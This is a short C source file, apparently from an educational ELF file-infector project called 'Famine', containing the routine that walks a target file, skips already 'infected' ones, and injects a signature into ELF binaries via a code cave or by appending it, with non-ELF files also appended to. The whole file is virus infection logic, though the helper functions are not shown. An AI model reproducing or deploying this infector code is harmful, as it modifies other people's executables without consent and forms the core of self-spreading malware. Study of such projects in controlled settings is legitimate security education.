#include "famine.h"

static void try_generic_append(t_file *file)
{
	if (sign_generic_append(file))
		LOG("[!] Failed to append signature\n");
	else
		LOG("[+] Signature appended\n");
}

void process_file(const char *path)
{
	t_file file;

	LOG("[*] Processing: %s\n", path);

	if (open_file(&file, path)) {
		LOG("[!] Failed to open: %s\n", path);
		return ;
	}
	if (map_file(&file)) {
		LOG("[!] Failed to map: %s\n", path);
		close_file(&file);
		return ;
	}

	if (is_file_infected(&file))
		LOG("[=] Already infected, skipping: %s\n", path);
	else if (is_valid_elf(&file)) {
		LOG("[+] Valid ELF detected: %s\n", path);
		if (process_elf(&file)) {
			LOG("[*] No code cave found, falling back to append\n");
			try_generic_append(&file);
		} else
			LOG("[+] Signature injected via code cave\n");
	} else {
		LOG("[*] Non-ELF file, appending signature\n");
		try_generic_append(&file);
	}

	unmap_file(&file);
	close_file(&file);
}
